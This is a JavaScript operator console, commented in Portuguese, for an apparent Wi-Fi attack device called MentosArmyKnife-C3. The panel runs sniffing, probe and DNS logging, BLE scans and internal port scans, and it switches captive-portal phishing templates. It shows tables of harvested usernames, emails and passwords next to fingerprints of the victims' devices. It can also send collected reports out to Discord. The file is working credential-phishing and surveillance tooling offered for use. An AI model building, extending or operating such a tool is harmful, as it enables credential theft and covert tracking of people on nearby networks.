// MentosArmyKnife-C3 — console do operador (offline, sem dependências externas).
(() => {
  'use strict';
  let csrf = null, pollTimer = null, activeTab = 'ctrl', sniffOn = false;
  const $ = (id) => document.getElementById(id);

  async function api(path, { method = 'GET', body = null } = {}) {
    const headers = {};
    if (csrf) headers['X-MAK-CSRF'] = csrf;
    if (body) headers['Content-Type'] = 'application/x-www-form-urlencoded';
    let res;
    try { res = await fetch(path, { method, headers, body, credentials: 'same-origin' }); }
    catch (_) { $('live').textContent = '● conexão indisponível'; return { ok: false, status: 0, json: { error: 'conexao_indisponivel' } }; }
    let json = {}; try { json = await res.json(); } catch (_) {}
    return { ok: res.ok, status: res.status, json };
  }
  const esc = (s) => String(s ?? '').replace(/[&<>"]/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  function fmtUptime(ms) {
    const s = Math.floor((ms || 0) / 1000);
    const p = (n) => String(n).padStart(2, '0');
    return `${p(Math.floor(s / 3600))}:${p(Math.floor((s / 60) % 60))}:${p(s % 60)}`;
  }
  function pill(el, on, a, b) { el.textContent = on ? a : b; el.className = 'pill ' + (on ? 'on' : 'off'); }
  function table(headers, rows) {
    if (!rows.length) return '<p class="note">Nenhum resultado registrado. Execute a ferramenta para começar.</p>';
    let h = '<table><thead><tr>' + headers.map((x) => `<th>${x}</th>`).join('') + '</tr></thead><tbody>';
    h += rows.map((r) => '<tr>' + r.map((c) => `<td>${c}</td>`).join('') + '</tr>').join('');
    return h + '</tbody></table>';
  }

  // ---- polling --------------------------------------------------------
  async function refreshHealth() {
    const { ok, json, status } = await api('/api/v1/health');
    if (!ok) { $('live').textContent = '● atualização falhou'; if (status === 401) showLogin(); return; }
    $('live').textContent = '● ao vivo';
    $('fw').textContent = json.fw || '—';
    $('stState').textContent = json.state || '—';
    $('stUptime').textContent = fmtUptime(json.uptime_ms);
    $('stHeap').textContent = Math.round((json.heap_free || 0) / 1024) + ' KB';
    $('stClients').textContent = json.ap_clients ?? '—';
    pill($('dcEnabled'), !!json.discord_enabled, 'habilitado', 'off');
    pill($('dcUplink'), !!json.discord_uplink, 'conectado', 'offline');
    $('dcPending').textContent = json.discord_pending ?? 0;
    $('reportStatus').textContent = `Discord: ${json.discord_report || 'idle'} · HTTP ${json.discord_http || 0} · pendentes ${json.discord_pending || 0} · eventos descartados ${json.discord_dropped || 0}. Código -2: aguardando relógio NTP; -1: falha TLS/rede.`;
  }
  async function refreshActive() {
    if (activeTab === 'network' || activeTab === 'uplink') return refreshNetwork();
    if (activeTab === 'events') return refreshEvents();
    if (activeTab === 'recon') return refreshRecon();
    if (activeTab === 'probes') return refreshProbes();
    if (activeTab === 'dns') return refreshDns();
    if (activeTab === 'caps') return refreshCaps();
    if (activeTab === 'devices') return refreshDevices();
    if (activeTab === 'ble') return refreshBle();
  }
  async function refreshEvents() {
    const { ok, json } = await api('/api/v1/events'); if (!ok) return;
    $('events').innerHTML = (json.events || []).slice().reverse().map((e) =>
      `<div class="ev"><span>${esc(e.type)}${e.scenario ? ' · ' + esc(e.scenario) : ''}${e.count ? ' · ' + e.count : ''}</span>` +
      `<span class="t">${fmtUptime(e.uptime_ms)}</span></div>`).join('') || '<p class="note">—</p>';
  }
  async function refreshRecon() {
    const { ok, json } = await api('/api/v1/recon'); if (!ok) return;
    sniffOn = !!json.sniffing; $('btnSniff').textContent = 'Sniffer: ' + (sniffOn ? 'ON' : 'OFF');
    $('btnSniff').className = sniffOn ? 'ok' : 'secondary';
    $('apTable').innerHTML = table(['SSID', 'BSSID', 'Ch', 'RSSI', 'Cripto'],
      (json.aps || []).map((a) => [esc(a.ssid), a.bssid, a.ch, a.rssi, esc(a.enc)]));
    $('cliTable').innerHTML = table(['MAC', 'RSSI'],
      (json.clients || []).map((c) => [c.mac, c.rssi]));
  }
  async function refreshProbes() {
    const { ok, json } = await api('/api/v1/probes'); if (!ok) return;
    const rows = (json.probes || []).sort((a, b) => b.count - a.count)
      .map((p) => [p.mac, esc(p.ssid), p.rssi, p.count]);
    $('probeTable').innerHTML = table(['Aparelho (MAC)', 'Rede procurada', 'RSSI', 'x'], rows);
  }
  async function refreshDns() {
    const { ok, json } = await api('/api/v1/dns'); if (!ok) return;
    const rows = (json.queries || []).sort((a, b) => b.count - a.count)
      .map((q) => [esc(q.name), q.count]);
    $('dnsTable').innerHTML = table(['Domínio consultado', 'x'], rows);
  }
  async function refreshCaps() {
    const { ok, json } = await api('/api/v1/captures'); if (!ok) return;
    const caps = json.captures || [];
    $('capDot').style.display = caps.length ? 'inline-block' : 'none';
    $('capTable').innerHTML = table(['Usuário / e‑mail', 'Senha', 'IP', 'Aparelho', 'Template', 'quando'],
      caps.slice().reverse().map((c) => {
        const d = c.device;
        const dev = d ? `${esc(d.os)} · ${esc(d.browser)} · ${esc(d.device)} · ${esc(d.screen)}` : '<span class="note">não associado</span>';
        return [`<b>${esc(c.user)}</b>`, `<b>${esc(c.pass)}</b>`, `<b>${esc(c.ip)}</b>`, dev, esc(c.template), fmtUptime(c.uptime_ms)];
      }));
  }
  async function refreshDevices() {
    const { ok, json } = await api('/api/v1/devices'); if (!ok) return;
    const devs = json.devices || [];
    $('devDot').style.display = devs.length ? 'inline-block' : 'none';
    $('devTable').innerHTML = table(['IP', 'SO', 'Navegador', 'Aparelho', 'Tela', 'CPU/RAM', 'Conexão', 'Bateria', 'Fuso', 'Template', 'quando'],
      devs.slice().reverse().map((d) => [
        `<b>${esc(d.ip)}</b>`, esc(d.os), esc(d.browser), esc(d.device) + (d.touch ? ' · touch' : ''),
        esc(d.screen), esc(d.cores) + ' / ' + esc(d.mem), esc(d.conn),
        esc(d.battery), esc(d.tz), esc(d.template), fmtUptime(d.uptime_ms)]));
  }
  async function refreshBle() {
    const { ok, json } = await api('/api/v1/ble'); if (!ok) return;
    const rows = (json.adverts || []).sort((a, b) => b.rssi - a.rssi)
      .map((a) => [esc(a.name), a.rssi, a.connectable ? 'sim' : 'não']);
    $('bleTable').innerHTML = table(['Dispositivo (nome)', 'RSSI', 'Aceita conexão'], rows);
  }

  async function loadPortalConfig() {
    const h = await api('/api/v1/health');
    if (h.ok && h.json.ap_ssid) $('apSsid').value = h.json.ap_ssid;
    const r = await api('/api/v1/portal/templates');
    if (r.ok) {
      const sel = $('portalTemplate'); sel.replaceChildren();
      (r.json.templates || []).forEach(t => { const o = document.createElement('option'); o.value = t.id; o.textContent = t.label; sel.appendChild(o); });
      sel.value = r.json.active || 'visitantes';
    }
  }

  function flash(el, msg) { if (el) el.textContent = msg; }

  async function refreshNetwork() {
    const { ok, json } = await api('/api/v1/network'); if (!ok) return;
    const n = json.connection;
    $('networkStatus').textContent = `${n.connected ? 'Conectado' : 'Desconectado / conectando'} · status ${n.status_code}\nRede: ${n.ssid} · canal ${n.channel}\nIP: ${n.ip} · máscara ${n.subnet}\nGateway: ${n.gateway} · DNS: ${n.dns}`;
    if (!$('tcpTarget').value && n.connected) $('tcpTarget').value = n.gateway;
    const t = json.tcp;
    $('tcpStatus').textContent = `${t.state} · ${t.target} · ${t.checked}/${t.total} portas\n` +
      (t.ports || []).map(p => `${p.port}: ${p.result === 'open' ? 'aberta' : 'sem conexão (fechada, filtrada ou timeout)'}`).join('\n');
    $('dnsResult').textContent = json.dns_lookup ? JSON.stringify(json.dns_lookup, null, 2) : 'Nenhuma consulta.';
    const d = json.discovery;
    $('discoveryResult').textContent = d ? `${d.ok ? 'Concluído' : 'Falha na consulta'} · ${d.service}\n` + (d.hosts || []).map(h => `${h.host}: ${h.ip}:${h.port}`).join('\n') : 'Nenhuma consulta.';
  }
  async function action(path, body) {
    flash($('actionMsg'), 'Executando operação…');
    const r = await api(path, { method: 'POST', body });
    flash($('actionMsg'), r.ok ? 'Operação aceita.' : 'Falha: ' + (r.json.error || r.status));
    return r;
  }
  async function download(path, filename) {
    try {
      const r = await fetch(path, { credentials: 'same-origin' });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      const blob = await r.blob(), url = URL.createObjectURL(blob);
      const a = document.createElement('a'); a.href = url; a.download = filename;
      document.body.appendChild(a); a.click(); a.remove();
      setTimeout(() => URL.revokeObjectURL(url), 10000);
      flash($('actionMsg'), 'Download preparado: ' + filename);
    } catch (e) { flash($('actionMsg'), 'Download falhou: ' + e.message); }
  }
  // ---- actions --------------------------------------------------------
  function bind() {
    $('btnStop').onclick = async () => { await action('/api/v1/scenarios/stop'); await refreshHealth(); await refreshActive(); };
    $('dcTest').onclick = async () => { const r = await action('/api/v1/discord/test'); if (r.ok) flash($('actionMsg'), r.json.sent_now ? 'Teste entregue.' : 'Teste pendente; verifique a fila.'); };
    $('btnScan').onclick = async () => { await action('/api/v1/recon/scan'); refreshRecon(); };
    $('btnBleScan').onclick = async () => { const r = await action('/api/v1/ble/scan'); if (r.ok) { flash($('bleMsg'), `Anúncios: ${r.json.advertisers ?? 0} · conectáveis: ${r.json.connectable ?? 0} · RSSI máx: ${r.json.rssi_max ?? '—'}`); refreshBle(); } };
    $('btnSniff').onclick = async () => { await action('/api/v1/recon/sniff', 'on=' + (sniffOn ? '0' : '1')); refreshRecon(); };
    $('btnPcap').onclick = () => download('/api/v1/reports/pcap', 'mentos-probes.pcap');
    $('btnDownload').onclick = () => download('/api/v1/reports/download', 'mentos-report.json');
    $('btnReportDiscord').onclick = async () => { const r = await action('/api/v1/reports/discord'); if (r.ok) flash($('actionMsg'), 'Relatório na fila. Aguarde o estado sent para confirmar entrega.'); refreshHealth(); };
    $('btnClear').onclick = async () => {
      if (!window.confirm('Apagar resultados locais e envios pendentes? Arquivos baixados e mensagens já enviadas ao Discord permanecem.')) return;
      await action('/api/v1/reports/clear'); refreshActive(); refreshHealth();
    };
    $('btnProject').onclick = () => document.body.classList.toggle('project');
    $('btnWifiList').onclick = async () => {
      const scan = await action('/api/v1/recon/scan'); if (!scan.ok) return;
      const r = await api('/api/v1/recon'); if (!r.ok) return;
      const list = $('wifiNetworks'); list.replaceChildren();
      (r.json.aps || []).forEach(a => { const o = document.createElement('option'); o.value = a.ssid; o.label = `${a.rssi} dBm · ${a.enc}`; list.appendChild(o); });
      flash($('actionMsg'), 'Redes atualizadas. Selecione o SSID no campo Rede.');
    };
    $('wifiForm').onsubmit = async e => {
      e.preventDefault();
      const body = new URLSearchParams({ ssid: $('wifiSsid').value, password: $('wifiPassword').value }).toString();
      const r = await action('/api/v1/network/connect', body);
      if (r.ok) { $('wifiPassword').value = ''; flash($('actionMsg'), 'Conexão iniciada. Aguarde o IP do uplink.'); }
      refreshNetwork();
    };
    $('btnDisconnect').onclick = async () => { await action('/api/v1/network/disconnect'); refreshNetwork(); };
    $('btnForget').onclick = async () => {
      if (!window.confirm('Esquecer a rede salva? O SSID e a senha serão apagados do dispositivo.')) return;
      const r = await action('/api/v1/network/forget');
      if (r.ok) { $('wifiSsid').value = ''; $('wifiPassword').value = ''; flash($('actionMsg'), 'Rede esquecida. Credenciais apagadas do dispositivo.'); }
      refreshNetwork();
    };
    $('apSsidForm').onsubmit = async e => {
      e.preventDefault();
      const ssid = $('apSsid').value.trim();
      if (!ssid) { flash($('apSsidMsg'), 'Informe um SSID (1–32 caracteres).'); return; }
      const r = await action('/api/v1/network/ap-ssid', new URLSearchParams({ ssid }).toString());
      if (r.ok) flash($('apSsidMsg'), 'SSID salvo. Reiniciando para aplicar — reconecte ao novo nome.');
    };
    $('portalTemplateForm').onsubmit = async e => {
      e.preventDefault();
      const r = await action('/api/v1/portal/template', new URLSearchParams({ template: $('portalTemplate').value }).toString());
      if (r.ok) flash($('portalTemplateMsg'), 'Template aplicado.');
    };
    $('tcpForm').onsubmit = async e => { e.preventDefault(); await action('/api/v1/network/scan', new URLSearchParams({ target: $('tcpTarget').value }).toString()); refreshNetwork(); };
    $('discoveryForm').onsubmit = async e => { e.preventDefault(); await action('/api/v1/network/discover', new URLSearchParams({ service: $('discoveryService').value }).toString()); refreshNetwork(); };
    $('btnTcpStop').onclick = async () => { await action('/api/v1/network/stop'); refreshNetwork(); };
    $('dnsForm').onsubmit = async e => { e.preventDefault(); await action('/api/v1/network/dns', new URLSearchParams({ host: $('dnsHost').value }).toString()); refreshNetwork(); };
    $('btnLogout').onclick = async () => { const r = await api('/api/v1/logout', { method: 'POST' }); if (r.ok || r.status === 401) showLogin(); else flash($('actionMsg'), 'Não foi possível encerrar a sessão. Tente novamente.'); };
    $('tabs').querySelectorAll('button').forEach(b => { b.onclick = () => navigate(b.dataset.tab); });
    document.querySelectorAll('[data-open]').forEach(b => { b.onclick = () => navigate(b.dataset.open); });
    $('btnSessionRetry').onclick = restoreSession;
  }
  const pageNames = { ctrl: 'Visão geral', recon: 'Recon Wi-Fi / PCAP', network: 'Rede interna', probes: 'Probe requests', dns: 'DNS observado', caps: 'Envios do portal', devices: 'Aparelhos (fingerprint)', events: 'Logs de operações', reports: 'Relatórios', uplink: 'Conexão Wi-Fi' };
  function navigate(tab) {
    activeTab = Object.prototype.hasOwnProperty.call(pageNames, tab) ? tab : 'ctrl';
    $('pageTitle').textContent = pageNames[activeTab];
    $('pageCategory').textContent = activeTab.toUpperCase();
    $('tabs').querySelectorAll('button').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === activeTab);
      b.setAttribute('aria-current', b.dataset.tab === activeTab ? 'page' : 'false');
    });
    document.querySelectorAll('.tabpane').forEach(p => p.classList.toggle('hidden', p.id !== 'tab-' + activeTab));
    history.replaceState(null, '', '#' + activeTab);
    if (csrf) refreshActive();
  }

  let refreshing = false;
  async function poll() {
    if (refreshing) return;
    refreshing = true;
    try { await refreshHealth(); if (csrf) await refreshActive(); } finally { refreshing = false; }
  }
  function showPanel() {
    $('loginCard').classList.add('hidden'); $('panel').classList.remove('hidden');
    $('sessionLoading').classList.add('hidden');
    navigate(location.hash.slice(1)); poll();
    loadPortalConfig();
    clearInterval(pollTimer);
    pollTimer = setInterval(poll, 3000);
  }
  function showLogin() { csrf = null; clearInterval(pollTimer); $('sessionLoading').classList.add('hidden'); $('panel').classList.add('hidden'); $('loginCard').classList.remove('hidden'); }

  $('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const { ok, json } = await api('/api/v1/login', { method: 'POST', body: 'password=' + encodeURIComponent($('pw').value) });
    if (ok && json.csrf) { csrf = json.csrf; $('pw').value = ''; $('loginMsg').textContent = ''; showPanel(); }
    else $('loginMsg').textContent = json.error === 'login_locked' ? 'Bloqueado por tentativas.' : 'Falha: ' + (json.error || 'login');
  });

  bind();
  async function restoreSession() {
    $('sessionLoading').classList.remove('hidden');
    $('btnSessionRetry').classList.add('hidden');
    const { ok, status, json } = await api('/api/v1/session');
    if (ok && json.csrf) { csrf = json.csrf; showPanel(); }
    else if (status === 401) showLogin();
    else { $('btnSessionRetry').classList.remove('hidden'); $('btnSessionRetry').textContent = 'Conexão indisponível · tentar novamente'; }
  }
  restoreSession();
})();
